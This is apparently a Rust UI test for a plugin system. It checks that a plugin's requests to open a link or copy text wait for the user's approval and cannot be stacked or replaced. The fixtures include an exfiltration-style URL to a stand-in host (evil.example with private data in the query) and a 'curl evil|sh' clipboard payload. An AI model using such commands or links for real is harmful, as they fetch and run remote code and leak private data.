//! A plugin's request to open a link or copy text waits for the user's answer.

use crate::plugins::{Ask, Request};

fn press(rt: &mut rune::Runtime<crate::App>, key: &str) {
    let (x, y) = rt.find(key).unwrap_or_else(|| panic!("{key} is on screen"));
    rt.pointer_move(x, y);
    rt.pointer_down(x, y);
    rt.pointer_up(x, y);
    rt.frame(0.1);
}

#[test]
fn a_plugins_request_waits_for_the_users_answer() {
    let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    let mut s = crate::init();
    s.data = crate::model::Data::sample();
    s.pending_place = None;
    // What a plugin's `changed` handler does as soon as it loads: nothing opens, the
    // request waits on screen.
    s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::open("https://evil.example/?d=private-repo").unwrap() });
    // It can't replace the request on screen with another one, or pile them up.
    s.plugin_asks(Request { plugin: "Sneaky".into(), ask: Ask::copy("curl evil|sh").unwrap() });
    assert_eq!(s.plugin_ask.as_ref().map(|r| &r.ask), Some(&Ask::Open("https://evil.example/?d=private-repo".into())));

    let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
    rt.frame(0.0);
    assert!(rt.find("plugin-ask").is_some(), "the request is shown");
    press(&mut rt, "plugin-ask-no");
    assert_eq!(rt.state.plugin_ask, None);
    assert!(rt.find("plugin-ask").is_none());
    assert!(rt.state.toast.is_none(), "refusing does nothing else");

    // Allowing a copy copies, once.
    rt.update(|s, _| s.plugin_asks(Request { plugin: "Checklist".into(), ask: Ask::copy("- [ ] ship it").unwrap() }));
    rt.frame(0.2);
    press(&mut rt, "plugin-ask-yes");
    assert_eq!(rt.state.plugin_ask, None);
    assert_eq!(rt.state.toast.as_ref().map(|t| t.text.as_str()), Some("Copied"));
}
